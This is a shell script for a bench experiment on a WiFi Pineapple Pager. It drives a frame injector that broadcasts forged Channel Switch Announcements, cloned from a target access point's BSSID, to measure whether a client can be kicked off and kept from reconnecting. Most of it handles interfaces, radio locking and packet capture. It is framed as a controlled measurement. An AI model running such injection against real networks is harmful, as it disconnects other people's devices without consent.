#!/bin/sh
# run_17a.sh -- day-one step 17a, run ON THE PAGER, one arm at a time.
#
# THE QUESTION. pineapd's CSA carries Channel Switch Count 0, and
# ieee80211_mgd_csa_present() discards a count-0 CSA before the auth/assoc refusal check, so
# pineapd's CSA can kick a client but can never deny it a reconnection. That reading is [A] --
# never measured on anything. This script is the measurement: same frame, same target, count 0
# against count 3.
#
# A SECOND, INDEPENDENT BLOCKER, found 2026-11-09: pineapd also hardcodes the New Channel Number to
# 14 (li a3,14 at 0x473634) -- 2484 MHz, Japan-only, 11b-only, absent from the US table -- so a
# client that DID honour pineapd's element would be told to move somewhere it may not go. pagerinj
# lets you name a legal channel, which is why <announce-chan> is mandatory here with no default.
#
# ⚠ WHY THIS NO LONGER STOPS PINEAPD BY DEFAULT -- measured on the bench 2026-11-09, four runs.
# dev/injector/README.md says to stop pineapd, because it hops the interface and its own CSA flood
# is a CSA-bearing clone source. An earlier revision of this script did that, and it cost three
# runs out of four: pineapd does not merely HOP wlan1mon, it OWNS it. After the first
# stop/start cycle the operator got
#     tcpdump: wlan0mon: That device is not up
#     WARNING: could not set freq
#     recv: Network is down          <- pagerinj transmitted NOTHING, rc=1
# on every subsequent run, and read the series as inconsistent client behaviour when in fact only
# the first run ever put a frame on the air. Stopping pineapd removes the very interfaces pagerinj
# needs.
# The channel-hop problem has a better answer that is already MEASURED: pineapd transmits fine
# under a held EXAMINE lock (CLAUDE.md "Third contact"), and EXAMINE pins the radio to the target's
# channel for us. So by default this script parks with EXAMINE and leaves pineapd alone.
# --stop-pineapd restores the old behaviour for the one case it is right for: when pineapd has
# recently been asked for a firmware CSA on this BSSID, so its own count-0 clones are in the air
# and pagerinj would skip them as clone sources. In that mode this script brings the interfaces
# back up itself and refuses to fire if it cannot.
#
# WHAT IT STILL DOES NOT DO. It does not tell you whether a frame reached the air. sendto()
# returning success proves nothing -- a cfg80211-blocked frame is freed and the path returns
# NETDEV_TX_OK. Pass a <watch-if> to capture, or better, use an external receiver. On 2.4 GHz
# wlan0mon can watch while wlan1mon injects; on 5 GHz it cannot (radio0 is 2g, receive-only), so
# there you need the external receiver and the capture argument is useless.
#
# Usage:
#   ./run_17a.sh <inject-if> <bssid> <target-chan> <announce-chan> <count> [watch-if] [--stop-pineapd]
#
#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 0 wlan0mon     # the count-0 control
#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 3 wlan0mon     # the arm that should differ
#
# Run the control FIRST, reconnect the client, then the count-3 arm. One arm per invocation on
# purpose: the thing being measured is a client's behaviour, and that needs you watching it.
# ALWAYS read the "frames left the radio" line at the end before believing anything you saw.

set -u

PAGERINJ="${PAGERINJ:-/root/pagerinj}"

die() { printf '%s\n' "$*" >&2; exit 1; }

[ $# -ge 5 ] || die "usage: $0 <inject-if> <bssid> <target-chan> <announce-chan> <count> [watch-if] [--stop-pineapd]"
IF="$1"; BSSID="$2"; TCHAN="$3"; ACHAN="$4"; COUNT="$5"
WIF=""; STOP_PINEAPD=0
shift 5
for a in "$@"; do
  case "$a" in
    --stop-pineapd) STOP_PINEAPD=1 ;;
    -*) die "unknown option: $a" ;;
    *) WIF="$a" ;;
  esac
done

[ -x "$PAGERINJ" ] || die "no injector at $PAGERINJ (set PAGERINJ=/path to override)"
case "$BSSID" in
  [0-9A-Fa-f][0-9A-Fa-f]:*:*:*:*:[0-9A-Fa-f][0-9A-Fa-f]) ;;
  *) die "bssid does not look like a MAC: $BSSID" ;;
esac
[ "$TCHAN" -gt 0 ] 2>/dev/null || die "target-chan must be a positive number"
[ "$ACHAN" -gt 0 ] 2>/dev/null || die "announce-chan must be a positive number"
[ "$COUNT" -ge 0 ] 2>/dev/null || die "count must be 0 or more"
[ "$TCHAN" != "$ACHAN" ] || die "announce-chan must differ from target-chan: a same-channel CSA announces no move, and pagerinj refuses it"

# 2.4 GHz channel -> centre MHz. Only 1-14, the band where the Pager can both inject and watch.
mhz_for() {
  if [ "$1" -ge 1 ] 2>/dev/null && [ "$1" -le 13 ]; then
    echo $(( 2407 + 5 * $1 ))
  elif [ "$1" = 14 ]; then echo 2484
  else echo ""; fi
}
FREQ="${FREQ:-$(mhz_for "$TCHAN")}"
[ -n "$FREQ" ] || die "cannot map channel $TCHAN to a frequency; pass FREQ=<MHz> yourself"

# iface_up <if> -> 0 when the kernel says the interface is up and running.
iface_up() {
  [ -r "/sys/class/net/$1/operstate" ] || return 1
  case "$(cat "/sys/class/net/$1/operstate" 2>/dev/null)" in
    up|unknown) ;;                       # a monitor iface commonly reports "unknown" while usable
    *) return 1 ;;
  esac
  # flags bit 0 is IFF_UP. /sys/class/net/<if>/flags is hex, e.g. 0x1003.
  f=$(cat "/sys/class/net/$1/flags" 2>/dev/null) || return 1
  case "$f" in *[13579bdfBDF]) return 0 ;; *) return 1 ;; esac
}

bring_up() {
  ip link set "$1" up 2>/dev/null || ifconfig "$1" up 2>/dev/null || return 1
  sleep 1
  iface_up "$1"
}

PINEAPD_WAS_UP=0
pidof pineapd >/dev/null 2>&1 && PINEAPD_WAS_UP=1
CAP=""; CAPERR="/tmp/run17a_cap.err"; OUT=""
EXAMINED=0

restore() {
  [ -n "$CAP" ] && kill "$CAP" 2>/dev/null
  if [ "$EXAMINED" = 1 ]; then
    PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1
  fi
  if [ "$STOP_PINEAPD" = 1 ] && [ "$PINEAPD_WAS_UP" = 1 ]; then
    printf -- '-- restarting pineapd\n' >&2
    /etc/init.d/pineapd start >/dev/null 2>&1 \
      || printf 'WARNING: pineapd did not restart; start it by hand\n' >&2
    # It owns the monitor interfaces, so give it time to put them back before the operator's next
    # run walks into "That device is not up" -- which is exactly what happened on the bench.
    i=0
    while [ "$i" -lt 12 ]; do
      iface_up "$IF" && break
      sleep 1; i=$(( i + 1 ))
    done
    iface_up "$IF" || printf 'WARNING: %s is still down after 12s. Wait, or reboot before re-running.\n' "$IF" >&2
  fi
  rm -f "$CAPERR" 2>/dev/null
}
trap restore EXIT INT TERM

printf -- '-- target %s ch %s (%s MHz); announcing ch %s with count %s on %s\n' \
  "$BSSID" "$TCHAN" "$FREQ" "$ACHAN" "$COUNT" "$IF" >&2

if [ "$STOP_PINEAPD" = 1 ]; then
  if [ "$PINEAPD_WAS_UP" = 1 ]; then
    printf -- '-- stopping pineapd (--stop-pineapd given)\n' >&2
    /etc/init.d/pineapd stop >/dev/null 2>&1
    sleep 2
  fi
  # pineapd OWNS these interfaces; stopping it takes them down. Measured on the bench.
  for i in "$IF" ${WIF:+$WIF}; do
    iface_up "$i" || { printf -- '-- %s went down with pineapd; bringing it up\n' "$i" >&2; bring_up "$i" || true; }
  done
  printf -- '-- parking %s on %s MHz\n' "$IF" "$FREQ" >&2
  iw dev "$IF" set freq "$FREQ" 20 2>/dev/null \
    || printf 'WARNING: could not set freq on %s; pagerinj uses whatever is there\n' "$IF" >&2
else
  # EXAMINE pins the radio to the target's channel without taking the interfaces away, and pineapd
  # is measured to transmit under a held lock. The lock must outlast the whole episode.
  LOCK=$(( 10 + 10 + 10 ))
  printf -- '-- parking with EXAMINE for %ss (pineapd left running: it owns %s)\n' "$LOCK" "$IF" >&2
  PINEAPPLE_EXAMINE_BSSID "$BSSID" "$LOCK" >/dev/null 2>&1
  PINEAPPLE_EXAMINE_CHANNEL "$TCHAN" "$LOCK" >/dev/null 2>&1
  EXAMINED=1
  sleep 2
fi

# Refuse to fire into a dead interface. pagerinj would print "recv: Network is down" and return 1,
# which the operator may not notice next to "did the client drop?" -- three bench runs were read as
# inconsistent client behaviour when nothing had been transmitted at all.
iface_up "$IF" || die "$IF is not up, so nothing can be transmitted. If you used --stop-pineapd, wait for pineapd to restore it, or run without that flag."

if [ -n "$WIF" ]; then
  mkdir -p /root/loot 2>/dev/null
  iface_up "$WIF" || { printf -- '-- %s is down; bringing it up\n' "$WIF" >&2; bring_up "$WIF" || true; }
  iw dev "$WIF" set freq "$FREQ" 20 2>/dev/null
  OUT="/root/loot/csa_17a_c${COUNT}_$(date +%s 2>/dev/null || echo now).pcap"
  # ONE primitive, on purpose. An earlier revision used
  #   (type mgt and subtype beacon or subtype action) and wlan addr2 <bssid>
  # and `subtype action` is NOT in pcap-filter's mgt subtype list, so the filter never compiled.
  # `wlan addr2 <bssid>` catches our cloned beacons, the AP's own beacons (useful: compare the two
  # and read the real DS channel) and 17c's action frames, since all carry the BSSID as addr2.
  # -U so records reach the file as they arrive: WITHOUT it tcpdump buffers, and the previous
  # revision's "is the file >= 24 bytes yet" arm test called a perfectly healthy capture dead while
  # tcpdump was printing its own "listening on ..." banner. The sound test is whether the PROCESS
  # is alive -- which is what CamHound's capture_bss does, and what this now copies.
  : >"$CAPERR"
  tcpdump -i "$WIF" -nn -e -s 0 -U -w "$OUT" "wlan addr2 $BSSID" >/dev/null 2>"$CAPERR" &
  CAP=$!
  sleep 2
  if kill -0 "$CAP" 2>/dev/null; then
    printf -- '-- capturing on %s -> %s\n' "$WIF" "$OUT" >&2
  else
    printf -- '!! capture died on %s. tcpdump said:\n' "$WIF" >&2
    sed -n '1,6p' "$CAPERR" >&2 2>/dev/null
    printf -- '!! re-check the filter with:  tcpdump -d wlan addr2 %s\n' "$BSSID" >&2
    CAP=""; OUT=""
  fi
fi

printf -- '-- firing\n' >&2
"$PAGERINJ" -i "$IF" --csa --bssid "$BSSID" --chan "$ACHAN" --count "$COUNT" --secs 10
RC=$?

if [ -n "$CAP" ]; then
  sleep 1; kill "$CAP" 2>/dev/null; wait "$CAP" 2>/dev/null; CAP=""
  if [ -s "$OUT" ]; then
    printf -- '-- capture: %s (%s bytes)\n' "$OUT" "$(wc -c <"$OUT")" >&2
    printf -- '-- read the CSA element with:  tcpdump -r %s -nn -e -vvv | grep -i -B2 -A4 switch\n' "$OUT" >&2
  else
    printf -- '!! capture file is empty: nothing was recorded, so nothing here is evidence\n' >&2
  fi
fi

# The headline, last, because it is the thing that decides whether the observation means anything.
if [ "$RC" = 0 ]; then
  printf -- '== FRAMES LEFT THE RADIO (pagerinj rc=0). sendto success is not proof of transmission,\n' >&2
  printf -- '== but rc!=0 IS proof of the opposite. Now: did the client drop, and can it re-associate?\n' >&2
else
  printf -- '== NOTHING WAS TRANSMITTED (pagerinj rc=%s). Whatever you just saw was not caused by this\n' "$RC" >&2
  printf -- '== run. Fix the error above and fire again before recording any observation.\n' >&2
fi
exit "$RC"
